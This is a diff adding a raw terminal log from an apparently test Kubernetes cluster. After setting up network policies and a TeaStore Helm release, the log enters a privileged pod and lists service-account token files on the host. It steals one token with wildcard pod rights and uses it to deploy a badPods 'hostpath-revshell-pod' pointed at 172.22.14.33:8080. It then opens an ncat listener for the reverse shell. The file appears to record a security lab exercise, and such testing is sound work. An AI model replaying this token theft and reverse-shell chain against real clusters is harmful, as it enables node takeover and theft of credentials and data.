@@ -1,0 +1,57 @@
+
+ubuntu@test-master:~$ cd ghv3/microservices/
+ubuntu@test-master:~/ghv3/microservices$ kubectl create -f deny-all.yml
+networkpolicy.networking.k8s.io/default-deny created
+ubuntu@test-master:~/ghv3/microservices$ kubectl create -f teastore-policy.yml
+networkpolicy.networking.k8s.io/ts-policy created
+ubuntu@test-master:~/ghv3/microservices$ kubectl create -f teastore-locust-policy
+error: the path "teastore-locust-policy" does not exist
+ubuntu@test-master:~/ghv3/microservices$ kubectl create -f teastore-locust-policy.yml
+networkpolicy.networking.k8s.io/ts-locust-policy created
+ubuntu@test-master:~/ghv3/microservices$ helm install teastore -n teastore-helm/
+Error: INSTALLATION FAILED: must either provide a name or specify --generate-name
+ubuntu@test-master:~/ghv3/microservices$ helm install teastore teastore-helm/   NAME: teastore
+LAST DEPLOYED: Fri Jul  5 20:32:59 2024
+NAMESPACE: test
+STATUS: deployed
+REVISION: 1
+TEST SUITE: None
+ubuntu@test-master:~/ghv3/microservices$ kubectl exec -it everything-allowed-exec-deployment-5b68c8d877-64pbw -n spark-operator -- bash
+
+root@test-master2:/# ./can-they.sh | grep pod
+Token Location: /host/var/lib/kubelet/pods/61e290c3-ead4-4d27-99bc-d028c7f6dfa6/volumes/kubernetes.io~projected/kube-api-access-x82bw/token
+Token Location: /host/var/lib/kubelet/pods/e5f4d46c-6bf6-40ac-9dcb-e96a3e62d91e/volumes/kubernetes.io~projected/kube-api-access-m6m9z/token
+Token Location: /host/var/lib/kubelet/pods/0d103c48-b5a4-43ab-84ae-e46e1ca0dc4b/volumes/kubernetes.io~projected/kube-api-access-jfvnr/token
+pods                                            []                                     []               [get list watch]
+pods/status                                     []                                     []               [patch]
+Token Location: /host/var/lib/kubelet/pods/2f091e72-307f-49bc-a08b-9b220ea24af3/volumes/kubernetes.io~projected/kube-api-access-rr5jl/token
+Token Location: /host/var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token
+pods                                                           []                                     []               [*]
+Token Location: /host/var/lib/kubelet/pods/84ca633b-a050-4671-834a-21485a762923/volumes/kubernetes.io~projected/kube-api-access-xrx55/token
+Token Location: /host/var/lib/kubelet/pods/29856fbe-9672-4b6a-b7ec-700ba58b8a55/volumes/kubernetes.io~projected/kube-api-access-wz59q/token
+Token Location: /host/var/lib/kubelet/pods/e69f6ef8-0a96-4fd0-b94f-4980953e734b/volumes/kubernetes.io~projected/kube-api-access-p8cdh/token
+Token Location: /host/var/lib/kubelet/pods/6100ada5-4186-48dc-be79-a1a3b284b6af/volumes/kubernetes.io~projected/kube-api-access-mrk4g/token
+root@test-master2:/# ./can-they.sh | grep pod
+Token Location: /host/var/lib/kubelet/pods/61e290c3-ead4-4d27-99bc-d028c7f6dfa6/volumes/kubernetes.io~projected/kube-api-access-x82bw/token
+Token Location: /host/var/lib/kubelet/pods/e5f4d46c-6bf6-40ac-9dcb-e96a3e62d91e/volumes/kubernetes.io~projected/kube-api-access-m6m9z/token
+Token Location: /host/var/lib/kubelet/pods/0d103c48-b5a4-43ab-84ae-e46e1ca0dc4b/volumes/kubernetes.io~projected/kube-api-access-jfvnr/token
+pods                                            []                                     []               [get list watch]
+pods/status                                     []                                     []               [patch]
+Token Location: /host/var/lib/kubelet/pods/2f091e72-307f-49bc-a08b-9b220ea24af3/volumes/kubernetes.io~projected/kube-api-access-rr5jl/token
+Token Location: /host/var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token
+pods                                                           []                                     []               [*]
+Token Location: /host/var/lib/kubelet/pods/84ca633b-a050-4671-834a-21485a762923/volumes/kubernetes.io~projected/kube-api-access-xrx55/token
+Token Location: /host/var/lib/kubelet/pods/29856fbe-9672-4b6a-b7ec-700ba58b8a55/volumes/kubernetes.io~projected/kube-api-access-wz59q/token
+Token Location: /host/var/lib/kubelet/pods/e69f6ef8-0a96-4fd0-b94f-4980953e734b/volumes/kubernetes.io~projected/kube-api-access-p8cdh/token
+Token Location: /host/var/lib/kubelet/pods/6100ada5-4186-48dc-be79-a1a3b284b6af/volumes/kubernetes.io~projected/kube-api-access-mrk4g/token
+root@test-master2:/# export cred=`cat /host/var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token`
+root@test-master2:/# cd badPods/
+root@test-master2:/badPods# HOST="172.22.14.33" PORT="8080" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply --token=$cred -f -
+pod/hostpath-revshell-pod created
+root@test-master2:/badPods# chroot /host bash
+root@test-master2:/# ncat --ssl -vlp 8080
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: E704 A7E9 3C2A B83F 3192 3D1B 46AD 26A9 5FD4 C43B
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
